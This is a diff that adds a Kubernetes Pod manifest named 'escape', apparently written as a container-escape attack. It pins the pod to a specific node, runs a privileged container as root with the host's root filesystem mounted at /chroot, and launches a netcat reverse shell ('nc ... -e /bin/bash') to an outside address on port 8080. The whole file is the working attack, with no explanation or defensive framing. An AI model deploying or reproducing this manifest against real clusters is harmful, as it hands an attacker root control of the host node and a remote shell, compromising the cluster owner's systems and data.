@@ -1,0 +1,25 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape
+  labels:
+    app: escape
+spec:
+  nodeName: interdata.1721187715
+  containers:
+    - image: littlehawk03/alpine:v2-bash
+      command: ["/bin/sh", "-c", "sleep 10 && nc 10.42.1.19 8080 -e /bin/bash"]
+      imagePullPolicy: IfNotPresent
+      volumeMounts:
+        - mountPath: /chroot
+          name: host
+      name: escape
+      securityContext:
+        privileged: true
+        runAsUser: 0
+  volumes:
+    - name: host
+      hostPath:
+        path: /
+        type: Directory
+  restartPolicy: Always
